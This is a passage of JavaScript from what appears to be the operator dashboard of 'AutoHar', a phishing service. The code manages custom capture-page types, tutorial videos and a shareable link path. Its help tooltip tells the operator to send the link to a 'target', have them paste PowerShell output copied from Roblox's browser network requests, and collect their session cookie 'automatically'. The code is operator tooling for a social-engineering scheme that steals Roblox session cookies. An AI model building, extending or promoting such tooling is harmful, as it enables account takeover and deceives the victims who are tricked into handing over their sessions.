    return m ? m[1] : null;
}

function renderVideoPreview() {
    var wrap = document.getElementById('ahVideoPreview');
    var input = document.getElementById('ahVideoInput');
    if (!wrap || !input) return;
    var vid = getYoutubeId(input.value);
    if (vid) {
        wrap.style.display = 'block';
        var thumbUrl = 'https://img.youtube.com/vi/' + vid + '/mqdefault.jpg';
        var ytLink = 'https://www.youtube.com/watch?v=' + vid;
        wrap.innerHTML = '<a href="' + ytLink + '" target="_blank" rel="noopener" style="text-decoration:none">' +
            '<div class="ah-yt-card">' +
                '<div class="ah-yt-thumb">' +
                    '<img src="' + thumbUrl + '" alt="Video thumbnail">' +
                    '<div class="ah-yt-play"><i class="fas fa-play"></i></div>' +
                '</div>' +
                '<div class="ah-yt-info">' +
                    '<div class="ah-yt-title">YouTube Video</div>' +
                    '<div class="ah-yt-sub"><i class="fab fa-youtube"></i> youtube.com</div>' +
                '</div>' +
            '</div>' +
        '</a>';
    } else {
        wrap.style.display = 'none';
        wrap.innerHTML = '';
    }
}

function saveAutoharVideo() {
    var btn = document.getElementById('ahVideoSave');
    var video = document.getElementById('ahVideoInput').value.trim();
    if (!ahSelectedCat) return;
    btn.textContent = '...';
    if (ahSelectedCat.startsWith('custom_')) {
        var slug = ahSelectedCat.replace('custom_', '');
        var typeData = customTypesData.find(function(t) { return t.type_slug === slug; });
        fetch('/pages/controller?action=save_autohar_type', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type_slug: slug, title: typeData ? typeData.title : slug, description: typeData ? typeData.description : '', video_url: video, button_text: typeData ? typeData.button_text : 'Submit' })
        }).then(function(r) { return r.json(); }).then(function(result) {
            if (result.success) {
                if (typeData) { typeData.video_url = video; }
                btn.textContent = 'Saved';
                btn.classList.add('saved');
                showSuccessModal();
                renderVideoPreview();
                setTimeout(function() { btn.classList.remove('visible'); }, 1500);
            } else { btn.textContent = 'Save'; }
        }).catch(function() { btn.textContent = 'Save'; });
    } else {
        ahVideos[ahSelectedCat] = video;
        fetch('/pages/controller?action=save_autohar', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ autohar_video_type: ahSelectedCat, autohar_video_url: video })
        }).then(function(r) { return r.json(); }).then(function(result) {
            if (result.success) {
                btn.textContent = 'Saved';
                btn.classList.add('saved');
                showSuccessModal();
                renderVideoPreview();
                setTimeout(function() { btn.classList.remove('visible'); }, 1500);
            } else { btn.textContent = 'Save'; }
        }).catch(function() { btn.textContent = 'Save'; });
    }
}

function saveAutoharPath() {
    var btn = document.getElementById('ahPathSave');
    var pathInput = document.getElementById('ahPathInput');
    var path = pathInput.value.trim();
    var err = document.getElementById('ahPathError');
    if (err) err.style.display = 'none';
    if (path.length > 30) { path = path.substring(0, 30); pathInput.value = path; }
    if (path.length < 3) {
        if (err) { err.textContent = 'Minimum 3 characters required'; err.style.display = 'block'; }
        return;
    }
    btn.textContent = '...';
    fetch('/pages/controller?action=save_autohar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ autohar_path: path })
    }).then(function(r) { return r.json(); }).then(function(result) {
        if (result.success) {
            btn.textContent = 'Saved';
            btn.classList.add('saved');
            showToast('Path saved', 'success');
            setTimeout(function() { btn.classList.remove('visible'); }, 1500);
        } else {
            btn.textContent = 'Save';
            if (result.error && result.error.indexOf('already') !== -1) {
                if (err) { err.textContent = 'This path is already taken'; err.style.display = 'block'; }
            } else {
                if (err) { err.textContent = result.error || 'Failed to save'; err.style.display = 'block'; }
            }
        }
    }).catch(function() { btn.textContent = 'Save'; });
}

function copyAutoharUrl() {
    var input = document.getElementById('ahCopyUrl');
    if (!input) return;
    navigator.clipboard.writeText(input.value).then(function() {
        var btn = input.nextElementSibling;
        btn.innerHTML = '<i class="fas fa-check"></i> Copied';
        setTimeout(function() { btn.innerHTML = '<i class="fas fa-copy"></i> Copy'; }, 2000);
    });
}

var editingSlug = null;

function openCreateModal() {
    editingSlug = null;
    document.getElementById('ahModalTitle').textContent = 'Create Custom Type';
    document.getElementById('ahModalSave').textContent = 'Create';
    document.getElementById('ctSlug').value = '';
    document.getElementById('ctSlug').disabled = false;
    document.getElementById('ctTitle').value = '';
    document.getElementById('ctDescription').value = '';
    document.getElementById('ctVideo').value = '';
    document.getElementById('ctButton').value = 'Submit';
    document.getElementById('ahCreateModal').classList.add('show');
}

function editCustomType(slug) {
    var typeData = customTypesData.find(function(t) { return t.type_slug === slug; });
    if (!typeData) return;
    editingSlug = slug;
    document.getElementById('ahModalTitle').textContent = 'Edit Custom Type';
    document.getElementById('ahModalSave').textContent = 'Save';
    document.getElementById('ctSlug').value = typeData.type_slug;
    document.getElementById('ctSlug').disabled = true;
    document.getElementById('ctTitle').value = typeData.title || '';
    document.getElementById('ctDescription').value = typeData.description || '';
    document.getElementById('ctVideo').value = typeData.video_url || '';
    document.getElementById('ctButton').value = typeData.button_text || 'Submit';
    document.getElementById('ahCreateModal').classList.add('show');
}

function closeCreateModal() {
    var modal = document.getElementById('ahCreateModal');
    modal.classList.remove('show');
}

function saveCustomType() {
    var slug = editingSlug || document.getElementById('ctSlug').value.trim();
    var title = document.getElementById('ctTitle').value.trim();
    var description = document.getElementById('ctDescription').value.trim();
    var video = document.getElementById('ctVideo').value.trim();
    var button = document.getElementById('ctButton').value.trim() || 'Submit';
    if (!slug || !title) { showToast('Slug and Title are required'); return; }
    fetch('/pages/controller?action=save_autohar_type', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type_slug: slug, title: title, description: description, video_url: video, button_text: button })
    }).then(function(r) { return r.json(); }).then(function(result) {
        if (result.success) {
            closeCreateModal();
            showSuccessModal();
            location.reload();
        } else { showToast(result.error || 'Failed to save type'); }
    }).catch(function() { showToast('Error saving type'); });
}

function deleteCustomType() {
    if (!editingSlug) return;
    if (!confirm('Delete this custom type?')) return;
    fetch('/pages/controller?action=delete_autohar_type', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type_slug: editingSlug })
    }).then(function(r) { return r.json(); }).then(function(result) {
        if (result.success) { location.reload(); }
        else { showToast(result.error || 'Failed to delete'); }
    }).catch(function() { showToast('Error deleting type'); });
}

document.getElementById('ahCreateModal').addEventListener('click', function(e) {
    if (e.target === this) closeCreateModal();
});

function openTutorialVideo() {
    var modal = document.getElementById('ahVideoModal');
    var video = document.getElementById('ahTutorialVideo');
    modal.classList.add('show');
    video.currentTime = 0;
    video.play();
}
function closeTutorialVideo() {
    var modal = document.getElementById('ahVideoModal');
    var video = document.getElementById('ahTutorialVideo');
    modal.classList.remove('show');
    video.pause();
}

(function() {
    var lang = (navigator.language || navigator.userLanguage || 'en').substring(0, 2).toLowerCase();
    var defaultText = "1. Send your AutoHar link to target\n2. They paste PowerShell output from Roblox\n3. Cookie is captured automatically\n\nTo get PowerShell: F12 \u2192 Network \u2192 Refresh \u2192 Right click any request \u2192 Copy as PowerShell";
    var icon = document.getElementById('ahHelpIcon');
    var box = document.getElementById('ahTooltipBox');
    var textEl = document.getElementById('ahTooltipText');
    if (!icon || !box || !textEl) return;
    var hideTimeout = null;
    var currentText = defaultText;
    function showTooltip() { clearTimeout(hideTimeout); box.classList.add('show'); }
    function hideTooltip() { hideTimeout = setTimeout(function() { box.classList.remove('show'); }, 150); }
    icon.addEventListener('mouseenter', showTooltip);
    icon.addEventListener('mouseleave', hideTooltip);
    box.addEventListener('mouseenter', showTooltip);
    box.addEventListener('mouseleave', hideTooltip);
    box.addEventListener('click', function() {
        navigator.clipboard.writeText(currentText.replace(/\n/g, '\n'));
        var tip = box.querySelector('.copy-tip');
        if (tip) { tip.textContent = 'Copied!'; setTimeout(function() { tip.textContent = 'Click to copy'; }, 1500); }
    });
    function setText(t) { currentText = t; textEl.textContent = t; }
    if (lang === 'en') { setText(defaultText); return; }
    fetch('https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=' + lang + '&dt=t&q=' + encodeURIComponent(defaultText))
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var translated = '';
            if (data && data[0]) { data[0].forEach(function(part) { if (part[0]) translated += part[0]; }); }
            setText(translated || defaultText);
        })
        .catch(function() { setText(defaultText); });
})();
</script>